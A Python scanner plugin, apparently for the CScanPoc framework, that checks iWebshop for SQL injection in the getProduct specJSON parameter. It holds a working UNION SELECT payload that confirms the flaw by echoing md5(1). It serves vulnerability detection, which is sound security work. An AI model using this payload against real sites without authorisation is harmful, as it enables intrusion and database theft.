# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'iWebshop_0006'  # 平台漏洞编号，留空
    name = 'iWebshop SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        iWebshop /index.php?controller=site&action=getProduct&specJSON= SQL注射漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=62061'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'iWebshop'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '60202a0c-e195-4725-a6fd-d990eaed0897'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # refer:http://www.wooyun.org/bugs/wooyun-2010-062061
            payload = '''/index.php?controller=site&action=getProduct&specJSON={"judger":"1'%20and%201=0%20union%20select%20md5(1),2,3,4,5,6,7,8,9%20and%20'1'%20=%20'1"}'''
            url = self.target + payload
            code, head, body, errcode, _url = hh.http(url)

            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in body:
                #security_hole('SQL-Injection:' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
